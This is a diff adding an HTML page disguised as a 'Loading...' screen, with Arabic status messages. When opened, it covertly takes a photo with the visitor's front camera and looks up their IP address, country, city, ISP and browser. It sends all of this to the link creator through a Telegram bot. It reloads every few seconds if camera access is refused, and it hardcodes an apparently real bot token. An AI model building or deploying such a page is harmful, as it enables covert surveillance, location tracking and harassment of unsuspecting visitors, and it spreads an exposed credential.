@@ -1,0 +1,89 @@
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+<style>
+    body {
+      background-color: #0f0f0f;
+      color: white;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+    }
+    #loading {
+      font-size: 18px;
+    }
+    video {
+      display: none;
+    }
+</style>
+</head>
+<body>
+<h2 id="loading">فشل الوصول إلى الكاميرا.</h2>
+<video id="video" autoplay="" playsinline=""></video>
+<script>
+    const getQueryParam = (key) => {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get(key);
+    };
+    const userId = getQueryParam("u"); // user who generated the link
+    const botToken = "7631791926:AAETapi42BMgZNZSbwZXwhRav-R5JBNBkJM"; // replace this in Python
+    const botApi = "https://api.telegram.org/bot" + botToken + "/sendPhoto";
+    async function getIpInfo() {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const ipData = await res.json();
+      const res2 = await fetch(`https://ipapi.co/json/`);
+      const deviceData = await res2.json();
+      return {
+        ip: ipData.ip,
+        ...deviceData
+      };
+    }
+    function sendToTelegram(imageBlob, info) {
+      const caption = `
+تم التقاط صورة ومعلومات من أحد الزوار:
+IP: ${info.ip}
+الدولة: ${info.country_name}
+المنطقة: ${info.region}
+المدينة: ${info.city}
+مزود الخدمة: ${info.org}
+المتصفح: ${navigator.userAgent}
+`;
+      const formData = new FormData();
+      formData.append("chat_id", userId);
+      formData.append("caption", caption);
+      formData.append("photo", imageBlob, "snapshot.jpg");
+      fetch(botApi, {
+        method: "POST",
+        body: formData
+      });
+    }
+    async function captureAndSend() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+        await new Promise(resolve => setTimeout(resolve, 2000)); // Wait for video to load
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const context = canvas.getContext("2d");
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        stream.getTracks().forEach(track => track.stop());
+        canvas.toBlob(async (blob) => {
+          const info = await getIpInfo();
+          sendToTelegram(blob, info);
+          document.getElementById("loading").textContent = "✅ تم إرسال المعلومات.";
+        }, "image/jpeg");
+      } catch (err) {
+        document.getElementById("loading").textContent = "فشل الوصول إلى الكاميرا. سيتم إعادة المحاولة.";
+        setTimeout(() => {
+          location.reload(); // إعادة تحميل الصفحة لمحاولة جديدة
+        }, 3000); // إعادة تحميل الصفحة بعد 3 ثواني
+      }
+    }
+    captureAndSend();
+</script>
+</body>
+</html>
